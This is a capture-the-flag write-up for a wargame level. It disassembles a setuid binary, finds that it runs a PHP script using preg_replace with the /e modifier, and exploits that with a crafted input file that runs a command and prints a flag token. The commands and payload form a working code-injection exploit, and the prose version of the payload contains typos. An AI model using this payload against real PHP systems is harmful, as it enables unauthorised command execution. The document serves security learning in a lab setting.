## LEVEL 06

---

In this level we have two files:

```shell
$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Both of these files have as owner `flag06` and so there can run `getflag`.

But `level06` file has special permissions.

```shell
$ getfacl level06
# file: level06
# owner: flag06
# group: level06
# flags: s--
user::rwx
group::---
group:level06:r-x
mask::r-x
other::---
```

So we can execute this file.

Now I want to know what this executable does.

```shell
$ gdb -q level06
(gdb) disas main
[...]
0x08048514 <+196>:	call   0x8048430 <execve@plt>
[...]
(gdb) x/32s 0x80487d5
0x80487d5:	 "/usr/bin/php"
0x80487e2:	 "/home/user/level06/level06.php"
```

Now I know that this executable executes the file `level06.php`. Now what this file does ?

```shell
$ cat level06.php
#!/usr/bin/php
<?php
    function y($m) {
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m);
        return $m;
    }
    function x($y, $z) {
        $a = file_get_contents($y); // get the file contents from $y
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); // replace [x...] with y("")
        $a = preg_replace("/\[/", "(", $a);
        $a = preg_replace("/\]/", ")", $a);
        return $a;
    }
    $r = x($argv[1], $argv[2]);
    print $r;
?>
```

This php script have vulnerability with the /e modifier. This means that when `preg_replace` is called the secoond parameter will be replaced and executed.

For example :
```
preg_replace(..., ..., '"[x salut]"') => "salut" and salut will execute salut like a script.
```

So I want to execute `{${exac_shell(getflat)}}` so the input must be `[x {${exac_shell(getflat)}}]`.

```shell
$ echo '[x {${exec(getflag)}}]' > /tmp/input
$ ./level06 /tmp/input
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```

---

*Source :*

*https://www.php.net/manual/fr/language.types.string.php#language.types.string.parsing.complex*

*https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4*